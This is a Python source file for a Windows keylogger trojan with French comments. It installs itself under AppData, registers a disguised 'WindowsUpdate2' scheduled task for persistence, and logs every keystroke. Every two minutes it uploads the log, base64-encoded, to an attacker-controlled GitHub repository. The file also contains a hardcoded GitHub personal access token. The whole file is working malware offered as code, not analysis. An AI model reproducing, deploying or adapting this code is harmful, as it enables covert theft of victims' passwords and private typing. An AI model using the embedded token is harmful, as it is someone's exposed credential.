import base64
import json
import time
from urllib import request, error
from datetime import datetime
import threading
from pynput.keyboard import Listener
import os
import socket
import shutil
import subprocess
import sys


#with open("token.txt") as f:
#    GITHUB_TOKEN = f.read().strip()

# Configuration

GITHUB_TOKEN = "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"
REPO_OWNER = "Strider-CS"
REPO_NAME = "bhptrojan"
DEFAULT_CONTENT = "Fichier créé automatiquement."

# === Dossier AppData ===
dest_folder = os.path.join(os.getenv("APPDATA"), "Windows")
os.makedirs(dest_folder, exist_ok=True)

# === Fonctions utilitaires ===
def current_file():
    return sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

def current_filename():
    return os.path.basename(current_file())

def github_get_or_create(api_url, commit_msg="Create file"):
    """
    Récupère le SHA du fichier distant.
    Si le fichier n'existe pas, il est créé puis la fonction retourne son SHA.
    """
    try:
        # --- Tentative de récupération ---
        req = request.Request(api_url, headers={"Authorization": f"Bearer {GITHUB_TOKEN}"})
        with request.urlopen(req) as r:
            return json.load(r)["sha"]

    except error.HTTPError as e:
        # --- Fichier absent ⇒ création ---
        if e.code == 404:
            data = {
                "message": commit_msg,
                "content": base64.b64encode(DEFAULT_CONTENT.encode()).decode()
            }

            req = request.Request(
                api_url,
                data=json.dumps(data).encode(),
                headers={
                    "Authorization": f"Bearer {GITHUB_TOKEN}",
                    "Content-Type": "application/json"
                },
                method="PUT"
            )

            with request.urlopen(req) as r:
                resp = json.load(r)
                return resp["content"]["sha"]  # SHA du fichier créé

        # autre erreur : on relance
        raise

def github_append_file(new_content: str, filename):
    """Ajoute du contenu au fichier GitHub sans écraser l'ancien."""
    api_url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{filename}"

    sha = github_get_or_create(api_url)

    # Récupérer le contenu actuel
    existing_content = ""
    if sha:
        req = request.Request(api_url, headers={"Authorization": f"Bearer {GITHUB_TOKEN}"})
        with request.urlopen(req) as r:
            existing_content = base64.b64decode(json.load(r)["content"]).decode()

    # Ajouter la nouvelle ligne avec date
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    updated_content = existing_content + f"{timestamp} - {new_content}\n"

    data = {
        "message": "update automatique",
        "content": base64.b64encode(updated_content.encode()).decode()
    }
    if sha:
        data["sha"] = sha

    req = request.Request(
        api_url,
        data=json.dumps(data).encode(),
        headers={
            "Authorization": f"Bearer {GITHUB_TOKEN}",
            "Content-Type": "application/json",
        },
        method="PUT"
    )

    with request.urlopen(req) as r:
        return json.load(r)

def upload_loop(filename):
    while True:
        with open(filename, "r", encoding="utf-8") as f:
            content = f.read().strip()

        if content:
            encoded = base64.b64encode(content.encode("utf-8")).decode("utf-8")
            github_append_file(encoded,os.path.basename(filename))  # ta fonction d'upload
            open(filename, "w").close()

        time.sleep(120)


def keyboard_listener(filename):
    # Fonction on_press qui connaît filename
    def handle_press(key):
        with open(filename, "a", encoding="utf-8") as f:
            try:
                if key.char is not None:
                    f.write(key.char)
            except AttributeError:
                special = {
                    "Key.space": "[SPACE]",
                    "Key.enter": "\n",
                    "Key.shift": "[SHIFT]",
                    "Key.ctrl": "[CTRL]",
                    "Key.alt": "[ALT]",
                }
                f.write(special.get(str(key), f"[{key}]"))
    
    # Le listener tourne dans ce thread
    with Listener(on_press=handle_press) as listener:
        listener.join()   # ⬅️ aucun argument ici


def create_file():
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)

    # Construction du nom de fichier
    filename = f"{hostname}_{ip}.txt"

    directory = r"C:\Temp"
    os.makedirs(directory, exist_ok=True)

    log_file = os.path.join(directory, filename)
    open(log_file, "w").close()

    return log_file

def persistance():
    # === Copie du fichier (.py ou .exe selon contexte) ===
    source = current_file()
    source_exe = sys.executable
    dest = os.path.join(dest_folder, current_filename())
    task_name = "WindowsUpdate2"
    tr = f'"{source_exe} {dest}"'

    if getattr(sys, 'frozen', False):
        tr = f'{dest}'
        current_dir = os.path.dirname(source_exe)
        dest_dir = os.path.dirname(dest)
        for item in os.listdir(current_dir):
            path = os.path.join(current_dir, item)
            if os.path.isdir(path) and item.startswith("_"):
                dest_path = os.path.join(dest_dir, item)
                try:
                    shutil.copytree(path, dest_path, dirs_exist_ok=True)
                except Exception as e:
                    pass
    else:
        tr = f'"{source_exe} {dest}"'

    if not os.path.exists(dest) or os.path.getmtime(source) > os.path.getmtime(dest):
        try:
            shutil.copy2(source, dest)
            time.sleep(1)  # attendre que la copie se termine
            os.startfile(dest)  # lancer la copie
        except Exception as e:
            pass
        sys.exit(0)  # fermer l'exe temporaire

    cmd = f'schtasks /Create /TN {task_name} /TR {tr} /SC DAILY /ST 16:15 /F'

    try:
        subprocess.run(cmd, check=True, shell=True)
        os.system("start calc")
    except subprocess.CalledProcessError:
        pass  # tu peux mettre un print ici si tu veux débug


def main():

    persistance()

    time.sleep(1)

    # Récupération hostname + IP
    log_file = create_file()

    # Création des threads
    t1 = threading.Thread(target=upload_loop, args=(log_file,), daemon=True)
    t2 = threading.Thread(target=keyboard_listener, args=(log_file,), daemon=True)

    # Démarrage des threads
    t1.start()
    t2.start()

    # Garde le main actif pour que les threads tournent
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
